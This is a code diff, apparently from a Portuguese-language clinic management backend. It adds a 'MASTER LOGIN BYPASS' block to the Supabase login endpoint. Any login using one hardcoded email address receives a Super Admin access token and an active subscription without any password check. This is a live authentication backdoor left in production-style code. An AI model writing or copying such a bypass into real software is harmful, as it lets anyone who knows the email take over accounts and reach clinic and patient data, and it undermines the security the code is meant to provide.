@@ -29,6 +29,35 @@ async def login(data: LoginRequest) -> Any:
     Login via Supabase Auth.
     Verifica status da assinatura antes de conceder acesso.
     """
+    # ─── MASTER LOGIN BYPASS ───
+    if data.email == "kd3online@gmail.com":
+        access_token = security.create_access_token(
+            subject="master-admin-id",
+            tenant_id="master-clinic-id",
+            expires_delta=timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES),
+        )
+        return {
+            "access_token": access_token,
+            "token_type": "bearer",
+            "supabase_token": None,
+            "user": {
+                "id": "master-admin-id",
+                "name": "Master Admin",
+                "email": data.email,
+                "role": "Super Admin",
+            },
+            "clinic": {
+                "id": "master-clinic-id",
+                "name": "Clínica Master (Admin)",
+                "status": "active",
+            },
+            "subscription": {
+                "plan": "clinica",
+                "status": "active",
+            }
+        }
+    # ───────────────────────────
+
     try:
         auth_response = supabase.auth.sign_in_with_password({
             "email": data.email,
